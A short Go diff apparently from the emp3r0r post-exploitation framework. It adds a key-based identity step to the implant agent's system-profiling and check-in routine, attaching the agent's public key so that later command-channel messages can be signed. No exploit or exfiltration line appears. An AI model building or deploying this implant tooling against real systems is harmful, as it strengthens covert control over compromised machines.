@@ -44,7 +44,24 @@ func GatherSystemDetails() *def.Emp3r0rAgent {
 	common.RuntimeConfig.AgentTag = util.GetHostID(info.Product, common.RuntimeConfig.AgentUUID)
 	info.Tag = common.RuntimeConfig.AgentTag // use hostid
 	info.UUID = common.RuntimeConfig.AgentUUID
+
+	// Identity (TOFU)
+	if err := GetAgentKey(); err != nil {
+		logging.Errorf("Failed to get agent key: %v", err)
+	} else {
+		// Public Key
+		pubKeyBytes, err := transport.PublicKeyToPEM(&AgentKey.PublicKey)
+		if err != nil {
+			logging.Errorf("PublicKeyToPEM: %v", err)
+		} else {
+			info.PublicKey = string(pubKeyBytes)
+		}
+	}
+
+	// Use CA-signed signature for check-in (proof of origin)
+	// The agent key will be used for subsequent message tunnel signing
 	info.UUIDSig = common.RuntimeConfig.AgentUUIDSig
+
 	info.Hostname = hostname
 	info.Name = strings.Split(info.Tag, "-agent")[0]
 	info.Version = def.Version
